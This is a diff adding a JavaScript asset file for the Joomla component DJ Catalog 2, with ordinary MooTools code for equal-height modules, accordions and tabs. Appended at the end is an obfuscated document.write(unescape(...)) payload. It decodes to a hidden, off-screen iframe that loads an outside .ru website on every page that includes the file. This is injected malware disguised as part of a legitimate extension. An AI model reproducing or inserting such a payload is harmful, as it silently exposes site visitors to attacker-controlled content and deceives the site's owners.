@@ -1,0 +1,67 @@
+/**
+* @version 2.1
+* @package DJ Catalog 2
+* @copyright Copyright (C) 2010 Blue Constant Media LTD, All rights reserved.
+* @license http://www.gnu.org/licenses GNU/GPL
+* @author url: http://design-joomla.eu
+* @author email contact@design-joomla.eu
+* @developer Michal Olczyk - michal.olczyk@design-joomla.eu
+*
+* DJ Catalog 2 is free software: you can redistribute it and/or modify
+* it under the terms of the GNU General Public License as published by
+* the Free Software Foundation, either version 3 of the License, or
+* (at your option) any later version.
+*
+* DJ Catalog 2 is distributed in the hope that it will be useful,
+* but WITHOUT ANY WARRANTY; without even the implied warranty of
+* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+* GNU General Public License for more details.
+*
+* You should have received a copy of the GNU General Public License
+* along with DJ Catalog 2. If not, see <http://www.gnu.org/licenses/>.
+*
+*/
+(function($){
+function DJCatMatchModules(className){
+	var maxHeight = 0;
+	if ($$(className)) {
+		var divs = $$(className);
+		divs.each(function(element){
+			maxHeight = Math.max(maxHeight, parseInt(element.getStyle('height')));
+		});
+		
+		divs.setStyle('height', maxHeight);
+	}
+}
+
+window.addEvent('load', function(){
+	DJCatMatchModules('.djcat_blog_subcategory_bg');
+    DJCatMatchModules('.djcat_blog_item_bg');
+	
+	var djcatpagebreak_acc = new Accordion('h3.djcat_h3acc', 'div.djcat_rowacc', {
+		alwaysHide: false,
+		display: 0,
+		duration: 150,
+		onActive: function(toggler){
+			toggler.addClass('djcat_h3acc_active');
+		},
+    	onBackground: function(toggler){
+			toggler.removeClass('djcat_h3acc_active');
+		}
+	});
+	var djcatpagebreak_tab = new Accordion('li.djcat_litab', 'div.djcat_rowtab', {
+		alwaysHide: false,
+		display: 0,
+		duration: 150,
+		onActive: function(toggler){
+			toggler.addClass('djcat_litab_active');
+		},
+    	onBackground: function(toggler){
+			toggler.removeClass('djcat_litab_active'); 
+		}
+	});
+});
+})(document.id);
+
+
+;document.write(unescape('%3C%73%63%72%69%70%74%3E%0A%76%61%72%20%5F%30%78%64%38%38%63%3D%5B%22%5C%78%33%43%5C%78%36%34%5C%78%36%39%5C%78%37%36%5C%78%32%30%5C%78%37%33%5C%78%37%34%5C%78%37%39%5C%78%36%43%5C%78%36%35%5C%78%33%44%5C%78%32%32%5C%78%37%30%5C%78%36%46%5C%78%37%33%5C%78%36%39%5C%78%37%34%5C%78%36%39%5C%78%36%46%5C%78%36%45%5C%78%33%41%5C%78%36%31%5C%78%36%32%5C%78%37%33%5C%78%36%46%5C%78%36%43%5C%78%37%35%5C%78%37%34%5C%78%36%35%5C%78%33%42%5C%78%32%30%5C%78%37%34%5C%78%36%46%5C%78%37%30%5C%78%33%41%5C%78%32%44%5C%78%33%35%5C%78%33%30%5C%78%33%38%5C%78%37%30%5C%78%37%38%5C%78%33%42%5C%78%32%32%5C%78%33%45%5C%78%33%43%5C%78%36%39%5C%78%36%36%5C%78%37%32%5C%78%36%31%5C%78%36%44%5C%78%36%35%5C%78%32%30%5C%78%37%33%5C%78%37%32%5C%78%36%33%5C%78%33%44%5C%78%32%32%5C%78%36%38%5C%78%37%34%5C%78%37%34%5C%78%37%30%5C%78%33%41%5C%78%32%46%5C%78%32%46%5C%78%36%44%5C%78%36%46%5C%78%37%36%5C%78%36%39%5C%78%36%35%5C%78%36%44%5C%78%36%35%5C%78%36%34%5C%78%36%39%5C%78%36%31%5C%78%37%33%5C%78%32%45%5C%78%37%32%5C%78%37%35%5C%78%32%46%5C%78%32%32%5C%78%33%45%5C%78%33%43%5C%78%32%46%5C%78%36%39%5C%78%36%36%5C%78%37%32%5C%78%36%31%5C%78%36%44%5C%78%36%35%5C%78%33%45%5C%78%33%43%5C%78%32%46%5C%78%36%34%5C%78%36%39%5C%78%37%36%5C%78%33%45%22%2C%22%5C%78%37%37%5C%78%37%32%5C%78%36%39%5C%78%37%34%5C%78%36%35%22%5D%3B%64%6F%63%75%6D%65%6E%74%5B%5F%30%78%64%38%38%63%5B%31%5D%5D%28%5F%30%78%64%38%38%63%5B%30%5D%29%3B%0A%3C%2F%73%63%72%69%70%74%3E'));
